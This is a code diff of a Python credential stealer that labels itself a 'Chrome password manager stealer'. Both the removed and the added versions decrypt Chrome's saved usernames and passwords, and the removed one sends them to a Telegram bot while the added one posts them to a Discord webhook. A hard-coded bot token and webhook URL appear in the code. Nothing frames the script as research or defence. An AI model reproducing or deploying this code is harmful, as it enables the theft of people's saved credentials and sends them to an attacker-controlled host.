@@ -1,66 +1,96 @@
-import os, json, base64, sqlite3, win32crypt, shutil, requests, getpass
-from datetime import datetime, timedelta
-from Crypto.Cipher import AES
+#CHROME PASSWORD MANAGER STEALER
+#CREATED BY CYBERSEL
+#INSERT DISCORD WEBHOOK AT LINE 37
 
-TELEGRAM_BOT_TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
-TELEGRAM_CHAT_ID = "6023417944"
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
+import requests
+import getpass
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
-    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-    with open(path, "r", encoding="utf-8") as f:
-        key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 def decrypt_password(password, key):
     try:
-        iv, payload = password[3:15], password[15:]
+        iv = password[3:15]
+        password = password[15:]
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
-    except:
+        return cipher.decrypt(password)[:-16].decode()
+    except Exception as e:
+        print(f"Failed to decrypt password: {e}")
         return ""
 
-def send_to_telegram(file_path):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    with open(file_path, "rb") as f:
-        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=5)
-
 def main():
-    temp_dir = "C:\\Temp"
-    os.makedirs(temp_dir, exist_ok=True)
-    output_file = os.path.join(temp_dir, f"{getpass.getuser()}_Chrome_Passwords.txt")
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-    temp_db = os.path.join(temp_dir, "ChromeData.db")
-
+    webhook_url = "https://discord.com/api/webhooks/1350761958542016523/SGEzW70L7YNhS_Ii6UdEthWX6Mch6EGQ7TGymzG1peKqc4SmV9fvwm7rgSV2CtOZqnvs"
+    
     try:
         key = get_encryption_key()
-        shutil.copyfile(db_path, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
-        output = []
-        for row in cursor.fetchall():
-            origin_url, username, password, date_created, date_last_used = row
-            if username or password:
-                password = decrypt_password(password, key)
-                entry = f"Origin URL: {origin_url}\nUsername: {username}\nPassword: {password}\n"
-                if date_created: entry += f"Created: {get_chrome_datetime(date_created)}\n"
-                if date_last_used: entry += f"Last Used: {get_chrome_datetime(date_last_used)}\n"
-                entry += "="*50 + "\n"
-                output.append(entry)
+        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                              "Google", "Chrome", "User Data", "default", "Login Data")
+        filename = "ChromeData.db"
+        output_file = f"{getpass.getuser()}_Chrome_Passwords.txt"
+        shutil.copyfile(db_path, filename)
+        db = sqlite3.connect(filename)
+        cursor = db.cursor()
+        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+       
+        with open(output_file, "w", encoding="utf-8") as f:
+            for row in cursor.fetchall():
+                origin_url = row[0]
+                action_url = row[1]
+                username = row[2]
+                password = decrypt_password(row[3], key)
+                date_created = row[4]
+                date_last_used = row[5]
+               
+                if username or password:
+                    f.write(f"Origin URL: {origin_url}\n")
+                    f.write(f"Action URL: {action_url}\n")
+                    f.write(f"Username: {username}\n")
+                    f.write(f"Password: {password}\n")
+                if date_created != 86400000000 and date_created:
+                    f.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
+                if date_last_used != 86400000000 and date_last_used:
+                    f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
+                f.write("="*50 + "\n")
+       
         cursor.close()
-        conn.close()
-        os.remove(temp_db)
+        db.close()
 
-        if output:
-            with open(output_file, "w", encoding="utf-8") as f:
-                f.write("".join(output))
-            send_to_telegram(output_file)
-            os.remove(output_file)
+        # Send the file to the Discord webhook
+        with open(output_file, "rb") as f:
+            response = requests.post(webhook_url, files={"file": f})
+            if response.status_code == 200:
+                print("File successfully sent to the webhook.")
+            else:
+                print(f"Failed to send file to the webhook. Status code: {response.status_code}")
+   
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"An error occurred: {e}")
+   
+    finally:
+        try:
+            os.remove(filename)
+            os.remove(output_file)
+        except Exception as e:
+            print(f"Failed to remove file: {e}")
 
 if __name__ == "__main__":
     main()
